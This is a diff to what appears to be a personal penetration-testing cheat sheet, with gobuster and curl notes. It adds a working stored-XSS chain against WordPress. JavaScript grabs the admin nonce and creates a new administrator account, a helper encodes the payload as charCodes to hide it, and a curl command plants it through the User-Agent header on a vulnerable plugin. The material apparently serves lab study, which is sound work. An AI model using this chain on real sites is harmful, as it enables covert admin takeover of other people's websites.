@@ -5,6 +5,15 @@ sitemap.xml
 HttpOnly prevents JavaScript
 Secure requires https, if not present we could intercept traffic.
 nonce prevents CSRF
+
+------------XSS------------
+<script>alert(42)</script>
+# Simple alert test
+< > ' " { } ;
+# Most common chars for possible XSS
+https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script
+
+=================================================================================
 +-------------Retrieve Nonce Header and create new admin user
 var ajaxRequest = new XMLHttpRequest();
 var requestURL = "/wp-admin/user-new.php";
@@ -20,6 +29,26 @@ ajaxRequest.open("POST", requestURL, true);
 ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 ajaxRequest.send(params);
 +------------------------------------
+# MinifyJS then encode, using Console in DevMode and this code:
++------------------------------------
+function encode_to_javascript(string) {
+            var input = string
+            var output = '';
+            for(pos = 0; pos < input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += ",";
+                }
+            }
+            return output;
+        }
+        
+let encoded = encode_to_javascript('insert_minified_javascript')
+console.log(encoded)
++-----------------------------------------
+curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,...109,115,41,59))</script>" --proxy 127.0.0.1:8080
+# This curl command will post the XSS on the vulnerable WP module, then the admin runs it opening the plugin and giving us access.
+=================================================================================
 
 gobuster dir -u 10.0.0.1 -w /usr/share/wordlists/dirb/common.txt -t 5
 # -u URL
@@ -29,12 +58,6 @@ gobuster dir -u 10.0.0.1 -w /usr/share/wordlists/dirb/common.txt -t 5
 gobuster dir -u http://192.168.1.1:55 -w /usr/share/wordlists/dirb/big.txt -p pattern
 # Inside pattern file we need to use {GOBUSTER}/v1 to show what part is needed to fuzz
 
-------------XSS------------
-<script>alert(42)</script>
-# Simple alert test
-< > ' " { } ;
-# Most common chars for possible XSS
-https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script
 
 ##############
 ## CURL
